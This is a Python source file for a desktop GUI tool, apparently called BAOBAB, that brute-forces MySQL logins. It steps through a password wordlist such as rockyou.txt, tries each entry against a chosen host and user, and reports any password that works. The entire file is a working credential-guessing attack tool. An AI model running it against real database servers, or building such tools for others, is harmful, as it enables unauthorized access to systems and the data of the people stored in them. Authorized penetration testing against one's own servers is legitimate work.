from tkinter import filedialog, scrolledtext
import customtkinter as ctk
import threading
import mysql.connector
import re
import time
import logging

# Global variables for GUI elements
output_area = None
progress_bar = None

# Setup logging
logging.basicConfig(filename='baobab_errors.log', level=logging.ERROR, format='%(asctime)s %(levelname)s: %(message)s')

# ANSI color codes for console (unused in GUI, kept for potential CLI usage)
class Colors:
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# Function to classify password complexity
def classify_password(password):
    if re.match(r"^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{2,}$", password):
        return "[High]"
    elif re.match(r"^(?=.*[0-9])[a-zA-Z0-9]{2,}$", password):
        return "[Medium]"
    else:
        return "[Low]"

# Function to attempt MySQL login
def brute_force_mysql(host, user, wordlist_path, output_label, delay=0):
    global output_area, progress_bar
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as file:
            total_lines = sum(1 for line in file)
            file.seek(0)
            for index, password in enumerate(file, start=1):
                password = password.strip()
                output_area.insert('end', f"Attempt {index}/{total_lines}: {password}\n")
                output_area.see('end')  # Auto-scroll to the latest entry
                # Update progress bar
                progress = (index / total_lines) * 100
                progress_bar.set(progress)
                output_label.configure(text=f"Current attempt: {password}")
                try:
                    connection = mysql.connector.connect(host=host, user=user, password=password)
                    if connection.is_connected():
                        connection.close()
                        output_label.configure(text=f"Password found: {password}, Complexity: {classify_password(password)}")
                        return
                except mysql.connector.Error as e:
                    logging.error(f"MySQL error: {e}")
                    time.sleep(delay)
    except FileNotFoundError:
        output_label.configure(text="Wordlist file not found.")
        logging.error("Wordlist file not found.")
    except Exception as e:
        output_label.configure(text=f"Unexpected error: {e}")
        output_area.insert('end', f"Error: {e}\n")
        output_area.see('end')
        logging.error(f"Unexpected error: {e}")

# GUI Setup
def setup_gui():
    global output_area, progress_bar
    window = ctk.CTk()
    window.title("BAOBAB : Best And Overpowered Beating Ass Brute-force")

    # Host input
    ctk.CTkLabel(window, text="MySQL Host:").pack(pady=10, padx=0)
    host_input = ctk.CTkEntry(window)
    host_input.pack(pady=0, padx=10)

    # User input
    ctk.CTkLabel(window, text="MySQL User:").pack(pady=10, padx=0)
    user_input = ctk.CTkEntry(window)
    user_input.pack(pady=0, padx=10)

    # Wordlist path input
    ctk.CTkLabel(window, text="Path to rockyou.txt:").pack(pady=10, padx=0)
    wordlist_frame = ctk.CTkFrame(window)
    wordlist_frame.pack(pady=0, padx=50)
    wordlist_input = ctk.CTkEntry(wordlist_frame)
    wordlist_input.pack(side='left', fill='x', expand=True)
    ctk.CTkButton(wordlist_frame, text="Browse", command=lambda: wordlist_input.insert(0, filedialog.askopenfilename())).pack(side='right')

    # Scrolled Text Area for detailed logging
    output_area = scrolledtext.ScrolledText(window, height=10, padx=10, pady=10)
    output_area.pack(pady=50)

    # Progress Bar
    progress_bar = ctk.CTkProgressBar(window)
    progress_bar.pack(pady=10)

    # Output label
    output_label = ctk.CTkLabel(window, text="Ready")
    output_label.pack(pady=10)

    # Start button
    start_button = ctk.CTkButton(window, text="Start Brute-Force", command=lambda: threading.Thread(target=brute_force_mysql, args=(host_input.get(), user_input.get(), wordlist_input.get(), output_label)).start())
    start_button.pack(pady=10)

    window.mainloop()

# Run the GUI
setup_gui()
